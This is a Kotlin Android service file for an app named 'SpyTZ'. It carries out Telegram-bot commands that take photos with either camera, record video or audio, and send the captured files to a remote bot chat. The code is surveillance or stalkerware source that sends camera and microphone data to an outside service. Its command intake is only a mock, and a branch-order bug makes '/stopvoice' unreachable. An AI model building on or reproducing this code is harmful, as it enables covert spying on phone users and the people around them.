package com.spy.tz

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.graphics.BitmapFactory
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class NotificationService : Service() {
    companion object {
        private const val TAG = "SpyTZ_Service"
        private const val CHANNEL_ID = "SpyTZ_Channel"
        private const val NOTIFICATION_ID = 1
    }

    private lateinit var botHelper: TelegramBotHelper
    private var isRecording = false
    private var recordingType = "" // video or voice

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createNotificationChannel()
        showNotification()
        
        botHelper = TelegramBotHelper(this)
        
        // Here you would normally poll for updates or receive intents
        // Since this is a simple example, let's assume we process a mock command or listen to a broadcast
        // For now, we just keep the service alive.
        
        return START_STICKY
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(CHANNEL_ID, "Spy TZ Service", NotificationManager.IMPORTANCE_LOW).apply {
            description = "Background monitoring"
        }
        val notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.createNotificationChannel(channel)
    }

    private fun showNotification() {
        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        }
        val pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE)

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle("Spy TZ Active")
            .setContentText("Monitoring...")
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setContentIntent(pendingIntent)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    // Function to handle incoming commands (Mock implementation)
    fun handleCommand(command: String, botToken: String, chatId: String) {
        when {
            command.startsWith("/photo") -> {
                val isFront = command.contains("front")
                val photoPath = botHelper.takePhoto(isFront)
                botHelper.sendPhotoToBot(botToken, chatId, photoPath ?: "", "Captured Photo")
            }
            command.startsWith("/record") -> {
                if (!isRecording) {
                    botHelper.startRecording(true, !command.contains("back")) // Default back unless specified
                    isRecording = true
                    recordingType = "video"
                }
            }
            command.startsWith("/stop") -> {
                if (isRecording) {
                    val file = botHelper.stopRecording()
                    if (recordingType == "video" && file != null) {
                        botHelper.sendVideoToBot(botToken, chatId, file.absolutePath)
                    }
                    isRecording = false
                }
            }
            command.startsWith("/voice") -> {
                if (!isRecording) {
                    botHelper.startRecording(false)
                    isRecording = true
                    recordingType = "voice"
                }
            }
            command.startsWith("/stopvoice") -> {
                if (isRecording && recordingType == "voice") {
                    val file = botHelper.stopRecording()
                    if (file != null) {
                        botHelper.sendAudioToBot(botToken, chatId, file.absolutePath)
                    }
                    isRecording = false
                }
            }
        }
    }
}
